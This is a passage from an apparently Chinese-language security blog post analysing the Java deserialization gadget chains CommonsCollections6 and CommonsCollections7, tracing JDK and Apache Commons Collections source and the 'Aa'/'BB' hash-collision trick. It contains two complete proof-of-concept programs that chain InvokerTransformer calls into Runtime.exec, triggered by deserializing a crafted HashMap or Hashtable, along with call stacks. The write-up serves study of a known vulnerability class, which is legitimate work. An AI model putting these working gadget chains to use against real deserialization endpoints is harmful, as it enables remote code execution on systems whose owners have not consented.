<code>get</code> 方法，如果 <code>map</code> 被 <code>LazyMap</code>
修饰过就可以调用到 <code>transform</code> 方法。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TiedMapEntry</span> <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry, KeyValue, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8453869361373831205L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map map;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getKey</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<code>java.util.HashMap#readObject</code> 方法会对 <code>key</code> 调用
<code>hash</code> 方法，进而调用 <code>key</code> 的
<code>hashCode</code> 方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>poc 如下： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;sky&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">triggerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        triggerMap.put(entry, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        outerMap.clear();</span><br><span class="line">        </span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(triggerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 调用栈如下： <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:338, HashMap (java.util)</span><br><span class="line">readObject:1397, HashMap (java.util)</span><br><span class="line">...</span><br><span class="line">main:34, CommonsCollections6 (com.example)</span><br></pre></td></tr></table></figure></div> 需要注意的是
<code>HashMap</code> 的 <code>put</code> 方法同样对 <code>key</code>
调用 <code>hash</code> 方法，进而调用 <code>key</code> 的
<code>hashCode</code> 方法。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 因此在 poc 中当我们
<code>triggerMap.put(entry, "123")</code> 时会调用
<code>TiedMapEntry.hashCode</code> 从而调用
<code>LazyMap.get</code>，使得 <code>TiedMapEntry.key</code> 已经放到
<code>TiedMapEntry.map</code> 中了，因此会导致后续反序列化无法虽然调用到
<code>LazyMap.get</code>，但是调用不到 <code>transform</code>
方法。解决方法是调用 <code>LazyMap.clear</code> 清空
<code>LazyMap</code> 。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> ###
CommonsCollections7（Hashtable→LazyMap） <code>Hashtable</code> 的
<code>readObject</code> 调用 <code>reconstitutionPut</code>
函数将反序列化出的键值对存储到哈希表 <code>table</code> 中。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Read in the length, threshold, and loadfactor</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>reconstitutionPut</code> 函数先对传入的
<code>key</code> 调用 <code>hashCode</code>
方法得到哈希值，然后计算出哈希值对应哈希表的下标
<code>index</code>。在哈希表 <code>tab</code> 中遍历 <code>index</code>
对应的那一项中的每一个元素
<code>e</code>，然后判断该元素的哈希值与当前要添加的那一项的哈希值是否相等。如果哈希值相等则调用
<code>e.key.equals</code> 方法。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> key.hashCode();</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; <span class="comment">// 如果哈希值相等则对哈希表中的 key 调用 equals 方法。</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></p>
<p>对于 <code>HashMap</code> 和 <code>LazyMap</code>
有如下继承关系：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/image-20241108030406773.png"
                     
alt="image-20241108030406773" 
                > 可以看到，<code>HashMap</code> 继承于
<code>AbstraceMap</code>，<code>LazyMap</code> 继承于
<code>AbstractMapDecorator</code>。</p>
<p>因此如果 <code>HashTable</code> 中的 <code>key</code> 都是
<code>LazyMap</code> 修饰的 <code>HashMap</code> 那么
<code>e.key.equals</code> 最终会调用 <code>LazyMap#get</code> 进而触发
<code>transform</code> 方法调用。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstraceMap</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (o == <span class="built_in">this</span>) <span class="comment">// 确保不是同一个 LazyMap 对象</span></span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">       <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">           <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">               Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">               <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">               <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">               <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key))) <span class="comment">// 调用 LazyMap#get</span></span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AbstractMapDecorator</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (object == <span class="built_in">this</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> map.equals(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>
根据前面的分析可知我们可以在 <code>Hashtable</code>
放两个键值对满足两个键哈希值相同但不是同一个的 <code>LazyMap</code>
对像。而 <code>LazyMap</code> 的哈希值实际上就是 <code>Map</code>
中所有「键和值的哈希的异或值」之和。 <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// Object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> o != <span class="literal">null</span> ? o.hashCode() : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// HashMap$Node (Map.Entry)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstraceMap</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext())</span><br><span class="line">            h += i.next().hashCode();</span><br><span class="line">        <span class="keyword">return</span> h;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// AbstractMapDecorator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">key.hashCode();</span><br></pre></td></tr></table></figure></div>
我们不妨让键值对中的值相等，那么就只需要考虑找哈希相等且值不同的键。</p>
<p>我们选择 <code>java.lang.String</code> 类型的键，这个类型的
<code>hashCode</code> 实现如下，我们很容易就想到可以构造长度为 2
的字符串，然后通过前一个字符的 ascii 码加 1 然后后一个字符的 ascii 码减
31 抵消前一个字符的影响来得到两个哈希相同的字符串（例如
<code>Aa</code>→<code>[65,97]</code>→<code>[65+1,97-31]</code>→<code>[66,66]</code>→<code>BB</code>）。
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> hash;</span><br><span class="line">    <span class="keyword">if</span> (h == <span class="number">0</span> &amp;&amp; value.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">char</span> val[] = value;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; value.length; i++) &#123;</span><br><span class="line">            h = <span class="number">31</span> * h + val[i];</span><br><span class="line">        &#125;</span><br><span class="line">        hash = h;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 完整 poc 如下： <div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        outerMap1.put(<span class="string">&quot;Aa&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        outerMap2.put(<span class="string">&quot;BB&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(outerMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(outerMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        outerMap2.remove(<span class="string">&quot;Aa&quot;</span>);</span><br><span class="line">        setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> 调用栈如下：
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">transform:122, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:158, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">equals:472, AbstractMap (java.util)</span><br><span class="line">equals:130, AbstractMapDecorator (org.apache.commons.collections.map)</span><br><span class="line">reconstitutionPut:1221, Hashtable (java.util)</span><br><span class="line">readObject:1195, Hashtable (java.util)</span><br><span class="line">...</span><br><span class="line">main:49, CommonsCollections7 (com.example)</span><br></pre></td></tr></table></figure></div> 由于 <code>Hashtable#put</code> 也会调用
<code>entry.key.equals</code> 方法导致利用链被触发一次，因此需要将调用
